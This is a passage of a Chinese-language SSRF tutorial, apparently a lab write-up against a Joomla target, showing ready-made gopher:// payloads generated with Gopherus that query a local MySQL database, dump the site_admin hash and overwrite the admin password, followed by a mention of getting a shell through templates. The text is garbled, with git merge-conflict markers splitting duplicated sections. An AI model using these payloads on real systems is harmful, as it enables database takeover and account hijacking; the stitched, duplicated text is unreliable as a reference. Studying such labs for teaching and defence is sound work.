[![](assets/1710898772-1b6a96642420011461a9e48d32933e65.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173022-263fbea8-e053-1.png)  
随后我们用同样方法构建 payload 其中 mysql 的查询语句为：

```plain
use joomla;select * from joomla_users;
```

[![](assets/1710898772-75085a35d5ddf6329fa6ff70b5a3bed4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173046-34d9eb28-e053-1.png)  
访问下面的连接

```plain
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%27%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
```

[![](assets/1710898772-7cc8ba84687a2e237d444d95ee6ec112.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173114-45522c36-e053-1.png)
=======
[![](assets/1710299749-ef3f093e8915bae666cb44c39b4fcf88.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172742-c700bd2a-e052-1.png)  
[![](assets/1710299749-6b12d1cf7b81a50868d9556763fd46df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172752-cd0b79c6-e052-1.png)

在之前的打靶过程中我们发现 Joomla 是可以管理数据库的，只是比较奇怪的是 nmap 并没有扫描出来 3306 端口，也许可能是靶机对其访问 IP 做了防护，导致只能以 127.0.0.1 连接，随后我们结合 Gopher 协议对本地的 MySQL 数据库发起攻击测试 (之前我们已经有了 mysql 的连接账户和密码)，在此之前我们要用一下 Gopherus 工具，生成用于攻击 MySQL 的攻击载荷，这里我们的数据库名称为 goblin，我们要执行的命令是使用 joomla 数据库并查看表名信息

```bash
Gopherus --exploit mysql
```

[![](assets/1710299749-423325e8bd05322e74dc4dc23bba13f4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172940-0d4ad662-e053-1.png)  
随后测试载荷：

```bash
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
```

[![](assets/1710299749-935b2de918094a2d53ee7e27d81b757d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173005-1c5b4812-e053-1.png)  
随后查看源代码发现 joomla\_users 这个表名  
[![](assets/1710299749-1b6a96642420011461a9e48d32933e65.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173022-263fbea8-e053-1.png)  
随后我们用同样方法构建 payload 其中 mysql 的查询语句为：

```bash
use joomla;select * from joomla_users;
```

[![](assets/1710299749-75085a35d5ddf6329fa6ff70b5a3bed4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173046-34d9eb28-e053-1.png)  
访问下面的连接

```bash
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%27%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
```

[![](assets/1710299749-7cc8ba84687a2e237d444d95ee6ec112.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173114-45522c36-e053-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

通过查看源代码以及结合 def (用于定义表的列) 定义每个列的含义和获取的查询数据可以得到这样一个数据：

-   用户：site\_admin
-   邮箱：site\_admin@nagini.hogwarts
-   密码：$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay

<<<<<<< HEAD
[![](assets/1710898772-fa1c59032f7a62b78517c34acaff6d6d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173139-547507a6-e053-1.png)  
如果我们直接破解这个密文不仅时间长，而且还有可能破不出来，既然通过 gopher 可以直接操作数据库，那么我们便可以直接覆盖这个 site\_admin 密码，由于 mysql 支持 md5 加密，所以我们先生成一个 md5 的加密密码

```plain
echo -n "123456" | md5sum
```

[![](assets/1710898772-59600795a7c680faa1ad9c2741ec2656.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173207-64b3547e-e053-1.png)  
随后我们直接构建如下 payload

```plain
use joomla; update joomla_users SET password='e10adc3949ba59abbe56e057f20f883e' WHERE username='site_admin';
```

[![](assets/1710898772-4e0b2560cfbf41d25d408dc87beaf7a7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173235-756c6832-e053-1.png)  
从上面的回显结果可以看到这里成功更新了一条记录，说明我们的密码已经成功更改，随后我们就可以使用 site\_admin/123456 直接登录 Joomla 后台了

[![](assets/1710898772-e7ea7caa78ee3711098f6b8cbbe0c77a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173259-84237a5a-e053-1.png)

[![](assets/1710898772-6f4543dd6a94304e42f0fe5290b945f5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173309-89a0d16c-e053-1.png)  
=======
[![](assets/1710299749-fa1c59032f7a62b78517c34acaff6d6d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173139-547507a6-e053-1.png)  
如果我们直接破解这个密文不仅时间长，而且还有可能破不出来，既然通过 gopher 可以直接操作数据库，那么我们便可以直接覆盖这个 site\_admin 密码，由于 mysql 支持 md5 加密，所以我们先生成一个 md5 的加密密码

```bash
echo -n "123456" | md5sum
```

[![](assets/1710299749-59600795a7c680faa1ad9c2741ec2656.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173207-64b3547e-e053-1.png)  
随后我们直接构建如下 payload

```bash
use joomla; update joomla_users SET password='e10adc3949ba59abbe56e057f20f883e' WHERE username='site_admin';
```

[![](assets/1710299749-4e0b2560cfbf41d25d408dc87beaf7a7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173235-756c6832-e053-1.png)  
从上面的回显结果可以看到这里成功更新了一条记录，说明我们的密码已经成功更改，随后我们就可以使用 site\_admin/123456 直接登录 Joomla 后台了

[![](assets/1710299749-e7ea7caa78ee3711098f6b8cbbe0c77a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173259-84237a5a-e053-1.png)

[![](assets/1710299749-6f4543dd6a94304e42f0fe5290b945f5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173309-89a0d16c-e053-1.png)  
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
紧接着我们就可以通过 Joomla 的后台模板功能去 getshell，这里就不做展开了，不过从上面的这个过程中大家可以看到我们构造了自己的 SQL 语句并通过 Gopher 协议进行了查询和数据的变更操作，这对于 file、dict 等协议是难以望其项背的～

## 文末小结

本篇文章我们主要对服务器端请求伪造的场景案例进行了介绍，同时通过案例对服务器端盖请求伪造的防护进行了绕过测试，并对绕过的方法进行了简易的归纳整理，最后我们通过一则靶场介绍了 Gopher 协议的强大之处和利用方法，在这里我们也预留一个面试中经常会问道的小问题 ——Gopher 协议构造载荷时载荷的格式是怎么样子的？载荷经过了几次 URL 编码？为什么要经过几次编码处理？供大家思考
